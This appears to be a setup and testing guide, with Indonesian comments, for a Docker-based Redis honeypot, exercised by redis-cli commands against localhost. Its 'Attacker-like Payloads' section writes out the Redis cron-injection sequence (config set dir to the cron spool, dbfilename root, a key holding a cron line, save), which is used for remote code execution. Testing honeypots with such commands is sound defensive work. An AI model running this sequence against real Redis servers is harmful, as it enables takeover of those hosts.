# redis honeypot
- [https://github.com/cypwnpwnsocute/RedisHoneyPot](https://github.com/cypwnpwnsocute/RedisHoneyPot)

## setup
```bash
git clone https://github.com/cypwnpwnsocute/RedisHoneyPot
cd RedisHoneyPot

cat << EOF > Dockerfile
# build stage
FROM golang:1.22 AS builder

WORKDIR /app
COPY . .

RUN go mod tidy
RUN go build -o redishoneypot *.go

# runtime stage
FROM debian:bookworm-slim

WORKDIR /app
COPY --from=builder /app/redishoneypot /app/
COPY redis.conf /app/

EXPOSE 6379

# jalankan dengan flag sesuai README
CMD ["./redishoneypot", "-addr", "0.0.0.0:6379", "-proto", "tcp", "-num", "1"]
EOF

# build image
docker build -t redishoneypot .

# run container
docker run -d --name redis-honeypot -p 6379:6379 redishoneypot
```

## testing
```bash
# install redis-cli jika belum ada
sudo apt-get install redis-tools -y

# tes koneksi ke honeypot
redis-cli -h 127.0.0.1 -p 6379 ping
redis-cli -h 127.0.0.1 -p 6379 set foo bar
redis-cli -h 127.0.0.1 -p 6379 get foo
```

### Basic Key Ops
```bash
# buat key baru
redis-cli -h 127.0.0.1 -p 6379 set mykey "HelloHoneypot"
# ambil value
redis-cli -h 127.0.0.1 -p 6379 get mykey
# cek apakah key ada
redis-cli -h 127.0.0.1 -p 6379 exists mykey
# hapus key
redis-cli -h 127.0.0.1 -p 6379 del mykey
# flush database
redis-cli -h 127.0.0.1 -p 6379 flushdb
# flush all db
redis-cli -h 127.0.0.1 -p 6379 flushall
```

### Key Listing
```bash
# buat beberapa key
redis-cli -h 127.0.0.1 -p 6379 set user:1 alice
redis-cli -h 127.0.0.1 -p 6379 set user:2 bob
redis-cli -h 127.0.0.1 -p 6379 set user:3 charlie

# cari semua key
redis-cli -h 127.0.0.1 -p 6379 keys '*'

# cari key dengan pola tertentu
redis-cli -h 127.0.0.1 -p 6379 keys 'user:*'
```

### Database Ops
```bash
# cek ukuran DB
redis-cli -h 127.0.0.1 -p 6379 dbsize

# ganti database index
redis-cli -h 127.0.0.1 -p 6379 select 1
redis-cli -h 127.0.0.1 -p 6379 set db1key test
redis-cli -h 127.0.0.1 -p 6379 get db1key

# balik ke db0
redis-cli -h 127.0.0.1 -p 6379 select 0
```

### Config / Info
```bash
# cek config
redis-cli -h 127.0.0.1 -p 6379 config get *

# ubah config (honeypot bisa pura-pura respon sukses)
redis-cli -h 127.0.0.1 -p 6379 config set requirepass "test123"

# cek info server
redis-cli -h 127.0.0.1 -p 6379 info
```

### Replication Test
```bash
# coba set redis slave
redis-cli -h 127.0.0.1 -p 6379 slaveof 127.0.0.1 6380

# coba stop replication
redis-cli -h 127.0.0.1 -p 6379 slaveof no one
```

### Persistence
```bash
# simpan DB manual
redis-cli -h 127.0.0.1 -p 6379 save
```

### Attacker-like Payloads
```bash
# coba tulis key yang panjang
redis-cli -h 127.0.0.1 -p 6379 set bigpayload "$(head -c 1024 </dev/urandom | base64)"

# coba injeksi cron job (biasa dipakai attacker untuk RCE via Redis write)
redis-cli -h 127.0.0.1 -p 6379 config set dir /var/spool/cron/
redis-cli -h 127.0.0.1 -p 6379 config set dbfilename root
redis-cli -h 127.0.0.1 -p 6379 set crontest "\n* * * * * /bin/echo hacked > /tmp/honey\n"
redis-cli -h 127.0.0.1 -p 6379 save
```

## log
```bash
docker logs -f redis-honeypot
```
